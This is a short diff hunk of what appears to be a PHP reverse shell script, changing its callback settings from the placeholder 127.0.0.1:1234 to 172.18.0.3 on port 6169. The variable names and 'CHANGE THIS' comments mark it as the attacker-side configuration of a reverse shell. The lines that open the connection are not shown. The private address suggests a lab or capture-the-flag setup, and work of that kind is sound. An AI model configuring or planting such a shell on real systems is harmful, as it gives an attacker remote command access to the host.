@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '172.18.0.3';  // CHANGE THIS Simple webserver
+$port = 6169;       // CHANGE THIS port number
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
